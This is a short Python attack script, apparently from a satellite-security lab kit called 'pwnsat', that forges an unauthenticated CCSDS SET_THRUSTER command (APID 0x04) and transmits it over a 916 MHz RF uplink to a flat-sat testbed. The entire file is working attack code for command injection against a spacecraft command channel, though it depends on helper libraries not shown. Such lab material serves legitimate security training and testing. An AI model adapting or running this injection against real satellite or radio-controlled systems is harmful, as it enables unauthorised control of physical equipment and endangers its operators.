#!/usr/bin/env python3
"""
Attack 03: Unauthenticated SET_THRUSTER Command Injection (RF Variant via Radio 1 RF Uplink)
Transmits unauthenticated SET_THRUSTER command (APID 0x04) over-the-air on 916 MHz.
"""
import os
import sys
import time

sys.path.append(os.path.abspath(os.path.join(os.path.dirname(__file__), "../lib")))
from pwnsat_packets import build_ccsds_packet
from pwnsat_rf import FlatSatRF

def main():
    print("[+] Attack 03: Unauthenticated SET_THRUSTER Command Injection (Over-The-Air RF 916 MHz Variant)")
    rf = FlatSatRF()
    packet = build_ccsds_packet(apid=0x04, payload=b"\x01\x64")
    print("[*] Transmitting forged SET_THRUSTER packet over 916.0 MHz uplink...")
    rf.transmit_rf(packet)
    print("[✓] RF Thruster command transmitted. NeoPixel LED set to Yellow.")

if __name__ == "__main__":
    main()
